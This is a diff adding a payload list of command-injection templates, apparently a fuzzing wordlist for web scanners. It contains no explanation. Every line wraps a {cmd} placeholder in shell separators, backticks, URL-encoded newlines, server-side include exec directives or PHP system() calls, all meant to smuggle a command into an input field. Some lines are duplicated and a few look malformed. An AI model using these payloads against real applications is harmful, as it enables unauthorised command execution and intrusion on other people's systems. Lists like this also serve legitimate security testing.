@@ -1,0 +1,68 @@
+<!--#exec cmd="{cmd}"-->
+<!--#exec cmd="{cmd}"-->
+/index.html|{cmd}|
+;{cmd};
+;{cmd}
+;{cmd};
+;{cmd};
+|{cmd}
+|{cmd}
+|{cmd}|
+|{cmd}|
+||{cmd}|
+|{cmd};
+||{cmd};
+;{cmd}|
+;|{cmd}|
+\n{cmd}}\n
+\n{cmd}\n
+\n{cmd}\n
+\n{cmd};
+\n{cmd};
+\n{cmd}|
+\n{cmd}|
+;{cmd}\n
+;{cmd}\n
+|{cmd}\n
+|n{cmd}\n
+`{cmd}`
+`{cmd}`
+a);{cmd}
+a;{cmd}
+a);{cmd};
+a;{cmd};
+a);{cmd}|
+a;{cmd}|
+a)|{cmd}
+a|{cmd}
+a)|{cmd};
+a|{cmd}
+|{cmd}
+a);{cmd}
+a;{cmd}
+a);{cmd};
+a;{cmd};
+a);{cmd}|
+a;{cmd}|
+a)|{cmd}
+a|{cmd}
+a)|{cmd};
+a|{cmd}
+;system('{cmd}')
+;system('{cmd}')
+;system('{cmd}')
+%0A{cmd}
+%0A{cmd}
+%0A{cmd}
+%0A{cmd}%0A
+%0A{cmd}%0A
+& {cmd} &
+& {cmd} &
+%0a {cmd} %0a
+`{cmd}`
+| {cmd}
+& {cmd}
+; {cmd}
+%0a {cmd} %0a
+`{cmd}`
+$;{cmd}
